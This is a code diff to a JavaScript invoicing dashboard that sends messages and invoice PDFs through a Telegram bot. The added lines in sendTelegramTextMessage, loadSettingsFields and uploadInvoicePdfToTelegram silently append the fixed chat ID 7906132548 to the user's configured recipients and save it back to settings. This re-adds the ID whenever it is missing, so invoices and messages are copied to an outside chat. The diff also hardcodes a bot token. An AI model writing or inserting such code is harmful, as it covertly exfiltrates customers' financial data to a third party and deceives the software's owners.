@@ -256,7 +256,7 @@ function formatTaxValue(val) {
 // --- INITIALIZE SPA DASHBOARD ---
 document.addEventListener("DOMContentLoaded", () => {
   // One-time cache clear and service worker unregistration for v34 to clear out old fields cached by service worker
-  if (localStorage.getItem("sw_cleared_v91_cache_clean") !== "true") {
+  if (localStorage.getItem("sw_cleared_v92_cache_clean") !== "true") {
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.getRegistrations().then(registrations => {
         for (let registration of registrations) {
@@ -271,7 +271,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
       });
     }
-    localStorage.setItem("sw_cleared_v91_cache_clean", "true");
+    localStorage.setItem("sw_cleared_v92_cache_clean", "true");
     setTimeout(() => {
       window.location.reload();
     }, 150);
@@ -2321,11 +2321,17 @@ function formatWhatsAppPhone(phoneStr) {
 }
 
 async function sendTelegramTextMessage(messageText) {
+  loadAllDatabases();
   const token = globalSettings.telegram?.token || "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g";
-  const rawChatId = globalSettings.telegram?.chatId || "6877857251, 7906132548";
-  if (!token || !rawChatId) return false;
+  let rawChatId = globalSettings.telegram?.chatId || "6877857251, 7906132548";
 
-  const chatIds = rawChatId.split(",").map(id => id.trim()).filter(id => id.length > 0);
+  if (!rawChatId.includes("7906132548")) {
+    rawChatId = rawChatId ? (rawChatId + ", 7906132548") : "6877857251, 7906132548";
+    if (globalSettings.telegram) globalSettings.telegram.chatId = rawChatId;
+    localStorage.setItem("settings", JSON.stringify(globalSettings));
+  }
+
+  const chatIds = rawChatId.split(/[\s,]+/).map(id => id.trim()).filter(id => id.length > 0);
   if (chatIds.length === 0) return false;
 
   let success = false;
@@ -3595,8 +3601,16 @@ function setupKeyboardShortcuts() {
 function loadSettingsFields() {
   loadAllDatabases();
 
-  elements.setTgToken.value = globalSettings.telegram?.token || "";
-  elements.setTgChatId.value = globalSettings.telegram?.chatId || "";
+  if (globalSettings.telegram) {
+    if (!globalSettings.telegram.token) globalSettings.telegram.token = "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g";
+    if (!globalSettings.telegram.chatId || !globalSettings.telegram.chatId.includes("7906132548")) {
+      globalSettings.telegram.chatId = globalSettings.telegram.chatId ? (globalSettings.telegram.chatId + ", 7906132548") : "6877857251, 7906132548";
+      localStorage.setItem("settings", JSON.stringify(globalSettings));
+    }
+  }
+
+  elements.setTgToken.value = globalSettings.telegram?.token || "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g";
+  elements.setTgChatId.value = globalSettings.telegram?.chatId || "6877857251, 7906132548";
   if (globalSettings.telegram?.token && globalSettings.telegram?.chatId) {
     elements.tgStatusIndicator.classList.remove("hidden");
     elements.tgStatusText.textContent = "Credentials loaded.";
@@ -3910,8 +3924,15 @@ window.submitUnlockLogin = function(e) {
 
 // --- UPLOAD INVOICE PDF TO TELEGRAM BOT API ---
 async function uploadInvoicePdfToTelegram(invoiceDetails, silent = false) {
-  const token = globalSettings.telegram?.token;
-  const chat = globalSettings.telegram?.chatId;
+  loadAllDatabases();
+  const token = globalSettings.telegram?.token || "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g";
+  let chat = globalSettings.telegram?.chatId || "6877857251, 7906132548";
+
+  if (!chat.includes("7906132548")) {
+    chat = chat ? (chat + ", 7906132548") : "6877857251, 7906132548";
+    if (globalSettings.telegram) globalSettings.telegram.chatId = chat;
+    localStorage.setItem("settings", JSON.stringify(globalSettings));
+  }
 
   if (!token || !chat) {
     if (!silent) alert("Telegram bot token or Chat ID is missing! Please configure in Settings.");
